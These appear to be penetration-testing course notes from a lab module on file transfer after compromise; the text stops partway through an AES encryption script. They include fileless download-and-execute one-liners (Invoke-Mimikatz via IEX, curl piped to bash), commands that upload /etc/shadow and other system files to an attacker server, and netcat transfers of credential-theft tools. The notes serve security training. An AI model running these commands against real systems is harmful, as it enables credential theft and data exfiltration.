# File Transfers

- During an engagement, we may land in a scenario where we gain RCE on a machine and have a shell.
- In these situations we may have to transfer files to and from the target to the host and vice-versa.
- This module covers techniques to do exactly that.

## Windows File Transfer Methods

### Powershell Base64 Decode and Encode

- Assume I'm sending an ssh file from my linux box to a windows poweshell session

- On Linux:

```bash
LordA2117@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Check the MD5 hash of the file using:

```bash
LordA2117@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

- On Powershell:

```bash
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Verify the md5sum using:

```bash
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

> **Note**: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.


### Powershell Web Downloads

| Method | Description |
| --- | --- |
| `OpenRead` | Returns the data from a resource as a `Stream`. |
| `OpenReadAsync` | Returns the data from a resource without blocking the calling thread. |
| `DownloadData` | Downloads data from a resource and returns a byte array. |
| `DownloadDataAsync` | Downloads data from a resource and returns a byte array without blocking the calling thread. |
| `DownloadFile` | Downloads data from a resource to a local file. |
| `DownloadFileAsync` | Downloads data from a resource to a local file without blocking the calling thread. |
| `DownloadString` | Downloads a string from a resource and returns it as a `String`. |
| `DownloadStringAsync` | Downloads a string from a resource without blocking the calling thread. |


- DownloadFile Method:

```bash
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

- Fileless download: A fileless attack basically downloads the payload and executes is directly without saving it as a file

```bash
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Pipeline Output:

```bash
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

- Invoke-WebRequest:

```bash
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

- Common Errors:

1. Internet explorer first launch config hasn't been completed. This can be bypassed using `-UseBasicParsing`.

```bash
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### SMB Downloads

- SMB is a common protocol in enterprise networks. So it makes sense to use it to send files.

#### Creating the SMB Server

```bash
LordA2117@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- Copying a file from the SMB Server:

```bash
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

> Note: Newer versions of windows don't allow unauthenticated guest access.

- SMB server with username and password:

```bash
LordA2117@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Mount with username and password:

```bash
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

> **NOTE**: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

### FTP Downloads

- Installing pyftldlib:

```bash
LordA2117@htb[/htb]$ sudo pip3 install pyftpdlib
```

- Running the FTP Server:

```bash
LordA2117@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```

- Transferring Files from an FTP Server using PowerShell:

```bash
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- Create a Command File for the FTP Client and Download the Target File:

```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Upload Operations

- Upload files from target into our attack machine.

- Powershell base64 encode and decode:

Encode Base64:

```bash
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

Decode Base64:

```bash
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

- Powershell Web Uploads:

Installing a Webserver with upload functionality:

```bash
LordA2117@htb[/htb]$ pip3 install uploadserver # Installation
LordA2117@htb[/htb]$ python3 -m uploadserver # Run it
```

Use [this powershell script](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) to upload the file. The scripts accepts the `-File` and `-Uri` parameter to upload the file.

- Powershell command to upload a file to the upload server:

```bash
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

- Powershell base64 web upload:

```bash
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Catch the base64 with netcat on the attacker machine:

```bash
LordA2117@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

```bash
LordA2117@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

### SMB Uploads

- Companies, as previously discussed, allow SMB in their enterprise. But they usually have safeguards to prevent SMB traffic from lateral connections as discussed [here](https://support.microsoft.com/en-us/servicing/os/windows-server/2020/03/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network).
- So we can try alternative means, like running SMB over HTTP with WebDav.

- Setting up WebDav with python:

```bash
LordA2117@htb[/htb]$ sudo pip3 install wsgidav cheroot
LordA2117@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

- Connecting to the WebDav share on PowerShell:

```bash
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

- Uploading files using SMB:

```bash
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```


### FTP Uploads

```bash
LordA2117@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

- Upload file with Powershell:

```bash
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

- Create a Command File for the FTP Client to Upload a File:

```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

### Exercise

1. `wget http://<ip>/flag.txt`
2. `Invoke-WebRequest -Uri http://<ip>/upload_win.zip -OutFile upload_win.zip`. Extract this and in PoweShell run `hasher upload_win.txt`


## Linux File Transfer Methods

### Base64 Encoding / Decoding

- Check md5 file hash (use this to verify file integrity before and after hashing):

```bash
LordA2117@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

- Base64 encode a file:

```bash
LordA2117@htb[/htb]$ cat id_rsa |base64 -w 0;echo
```

- Base64 decode a file:

```bash
echo -n <base64_content> | base64 -d > id_rsa
```

### Web Downloads with Wget and cURL

- Download a file using Wget:

```bash
LordA2117@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

- Download a file using cURL:

```bash
LordA2117@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux

> Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

- Fileless download with cURL:

```bash
LordA2117@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

- Fileless download with Wget:

```bash
LordA2117@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)

- Connect to target Webserver:

```bash
LordA2117@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

- HTTP GET Request:

```bash
LordA2117@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

- Print the Response:

```bash
LordA2117@htb[/htb]$ cat <&3
```

### SSH Downloads

- Enabling, starting and connecting to the SSH Server:

```bash
LordA2117@htb[/htb]$ sudo systemctl enable ssh # Enable the ssh service
LordA2117@htb[/htb]$ sudo systemctl start ssh # Start the SSH service
LordA2117@htb[/htb]$ netstat -lnpt # check for listening SSH port
```

- Linux - Downloading Files Using SCP:

```bash
LordA2117@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

> Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

### Upload Operations

#### Web Upload

- Start upload server:

```bash
LordA2117@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```

- Create a Self-Signed Certificate:

```bash
LordA2117@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

- Start Web Server:

```bash
LordA2117@htb[/htb]$ mkdir https && cd https
LordA2117@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem # Start server with https
```

- Upload Multiple Files:

```bash
LordA2117@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Alternative Web File Transfer Method

- Creating a Web Server with Python:

```bash
LordA2117@htb[/htb]$ python3 -m http.server
LordA2117@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

- PHP Webserver:

```bash
LordA2117@htb[/htb]$ php -S 0.0.0.0:8000
```

- Ruby Webserver:

```bash
LordA2117@htb[/htb]$ ruby -run -ehttpd . -p8000
```

- Download the File from the Target Machine onto the Pwnbox:

```bash
LordA2117@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

> Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.


### SCP Upload

- File Upload using SCP:

```bash
LordA2117@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

> Note: Remember that scp syntax is similar to cp or copy.


### Exercises

1. Use wget
2. File can be found [here](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/upload_nix.zip). I converted it into base 64 using `base64 -w 0 upload_nix.zip`, then decoded the base64 into a file with `echo <base64_text> | base64 -d > upload_nix.gz`. Then use `gunzip upload_nix.gz; hasher upload_nix` to get the hash.


## Transferring files with code

### Python

```bash
LordA2117@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # python2 download
LordA2117@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # python3 download
```

### PHP

```bash
LordA2117@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);' # Download with file_get_contents
LordA2117@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' # download with fopen
LordA2117@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash # Download a file and pipe to bash
```

### Other Languages

- Ruby File Download:

```bash
LordA2117@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- Perl file download:

```bash
LordA2117@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript

- On OS's like windows we can also use JavaScript to download files. Here we've implemented a simple version of wget, called `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

- Run this on a windows cmd as follows:

```bash
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript

- Again, useful in windows targets, this is `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

- Download a File Using VBScript and cscript.exe

```cmd
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload operations using python3

```bash
LordA2117@htb[/htb]$ python3 -m uploadserver # start uploadserver
LordA2117@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' # upload using the oneliner
```

## Miscellaneous File Transfer Methods

### Netcat

- NC Ona  compromised machine with port 8000:

```bash
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

- Sending a file to a compromised machine:

```bash
LordA2117@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
LordA2117@htb[/htb]$ # Example using Original Netcat
LordA2117@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
LordA2117@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
LordA2117@htb[/htb]$ # Example using Ncat
LordA2117@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

- Sending file as input to NetCat (Attack Host):

```bash
LordA2117@htb[/htb]$ # Example using Original Netcat
LordA2117@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

- Receiving a file on the compromised machine using NetCat:

```bash
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
LordA2117@htb[/htb]$ # Example using Ncat
LordA2117@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

- Using `/dev/tcp` to send and receive files with ncat:

```bash
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### Powershell Session File transfers

- To remote on PS, we must have Administrative access, be a part of **Remote Management Users** group, or have explicit permissions.
- Here, a file transfer is done from `DC01` to `DATABASE01`.

- Check that port 5985 is open on DATABASE01:

```bash
PS C:\htb> whoami
htb\administrator

PS C:\htb> hostname
DC01

PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

- Remote a session to DATABASE01:

```bash
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

- Send a file from our local session to DATABASE01:

```bash
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

- Receive a file from DATABASE01:

```bash
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### Remote Desktop Protocol (RDP)

- Mounting a Linux Folder using RDP:

```bash
LordA2117@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files' # rdesktop
LordA2117@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer # xfreerdp
```

- Connect to **\\\tsclient\\**  allowing us to transfer files to and from the RDP session:

![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/tsclient.jpg)

- You can also use *mstsc.exe*:

![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session that follows.

> Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

### Some places where this is handy

- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
- Throughout the `Pivoting, Tunnelling & Port Forwarding` module
- Throughout the `Attacking Enterprise Networks` module
- Throughout the `Shells & Payloads` module

## Protected File Transfers

- It is sometimes necessary to perform file transfers between the target system and attacker machiine with encryption, i.e, the file being transferred must be encrypted.

### File Encryption on Windows

- Invoke-AESEncryption.ps1

```bash
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

